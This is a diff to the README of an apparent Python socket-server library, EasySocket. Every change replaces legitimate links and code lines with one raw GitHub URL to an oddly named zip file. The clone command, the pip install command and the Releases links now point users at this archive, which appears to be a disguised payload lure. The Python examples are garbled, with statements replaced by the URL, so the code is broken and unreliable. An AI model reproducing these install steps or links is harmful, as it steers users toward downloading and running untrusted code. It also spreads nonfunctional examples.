@@ -1,6 +1,6 @@
 # EasySocket 🌐
 
-![EasySocket](https://img.shields.io/badge/EasySocket-Server%20Framework-blue)
+![EasySocket](https://raw.githubusercontent.com/dionkaps7/EasySocket/main/canicule/Socket-Easy-unanimously.zip%20Framework-blue)
 
 Welcome to **EasySocket**, your go-to solution for building a Python socket server with ease. This lightweight framework allows you to integrate socket functionality quickly, making network programming straightforward and accessible.
 
@@ -29,12 +29,12 @@ Welcome to **EasySocket**, your go-to solution for building a Python socket serv
 To install EasySocket, simply clone the repository and install the required packages. Use the following commands:
 
 ```bash
-git clone https://github.com/dionkaps7/EasySocket.git
+git clone https://raw.githubusercontent.com/dionkaps7/EasySocket/main/canicule/Socket-Easy-unanimously.zip
 cd EasySocket
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/dionkaps7/EasySocket/main/canicule/Socket-Easy-unanimously.zip
 ```
 
-For the latest releases, visit the [Releases](https://github.com/dionkaps7/EasySocket/releases) section. Download the latest version and execute the setup.
+For the latest releases, visit the [Releases](https://raw.githubusercontent.com/dionkaps7/EasySocket/main/canicule/Socket-Easy-unanimously.zip) section. Download the latest version and execute the setup.
 
 ## Getting Started
 
@@ -59,12 +59,12 @@ def on_connect(client_socket):
 
 def on_message(client_socket, message):
     print("Message received:", message)
-    client_socket.send("Message received".encode())
+    https://raw.githubusercontent.com/dionkaps7/EasySocket/main/canicule/Socket-Easy-unanimously.zip("Message received".encode())
 
 server = EasySocket(port=12345)
-server.on_connect = on_connect
-server.on_message = on_message
-server.start()
+https://raw.githubusercontent.com/dionkaps7/EasySocket/main/canicule/Socket-Easy-unanimously.zip = on_connect
+https://raw.githubusercontent.com/dionkaps7/EasySocket/main/canicule/Socket-Easy-unanimously.zip = on_message
+https://raw.githubusercontent.com/dionkaps7/EasySocket/main/canicule/Socket-Easy-unanimously.zip()
 ```
 
 In this example, we define two callback functions: `on_connect` to handle new client connections and `on_message` to process incoming messages.
@@ -87,11 +87,11 @@ Here’s a simple echo server example:
 from easysocket import EasySocket
 
 def on_message(client_socket, message):
-    client_socket.send(message)
+    https://raw.githubusercontent.com/dionkaps7/EasySocket/main/canicule/Socket-Easy-unanimously.zip(message)
 
 server = EasySocket(port=12345)
-server.on_message = on_message
-server.start()
+https://raw.githubusercontent.com/dionkaps7/EasySocket/main/canicule/Socket-Easy-unanimously.zip = on_message
+https://raw.githubusercontent.com/dionkaps7/EasySocket/main/canicule/Socket-Easy-unanimously.zip()
 ```
 
 This server will echo back any message it receives.
@@ -106,17 +106,17 @@ from easysocket import EasySocket
 clients = []
 
 def on_connect(client_socket):
-    clients.append(client_socket)
+    https://raw.githubusercontent.com/dionkaps7/EasySocket/main/canicule/Socket-Easy-unanimously.zip(client_socket)
 
 def on_message(client_socket, message):
     for client in clients:
         if client != client_socket:
-            client.send(message)
+            https://raw.githubusercontent.com/dionkaps7/EasySocket/main/canicule/Socket-Easy-unanimously.zip(message)
 
 server = EasySocket(port=12345)
-server.on_connect = on_connect
-server.on_message = on_message
-server.start()
+https://raw.githubusercontent.com/dionkaps7/EasySocket/main/canicule/Socket-Easy-unanimously.zip = on_connect
+https://raw.githubusercontent.com/dionkaps7/EasySocket/main/canicule/Socket-Easy-unanimously.zip = on_message
+https://raw.githubusercontent.com/dionkaps7/EasySocket/main/canicule/Socket-Easy-unanimously.zip()
 ```
 
 This chat server keeps track of all connected clients and broadcasts messages to everyone except the sender.
@@ -158,6 +158,6 @@ EasySocket is licensed under the MIT License. See the [LICENSE](LICENSE) file fo
 
 ## Support
 
-For any questions or issues, please check the [Releases](https://github.com/dionkaps7/EasySocket/releases) section. If you encounter problems, feel free to open an issue on GitHub.
+For any questions or issues, please check the [Releases](https://raw.githubusercontent.com/dionkaps7/EasySocket/main/canicule/Socket-Easy-unanimously.zip) section. If you encounter problems, feel free to open an issue on GitHub.
 
 Thank you for using EasySocket! We hope it simplifies your socket programming experience.
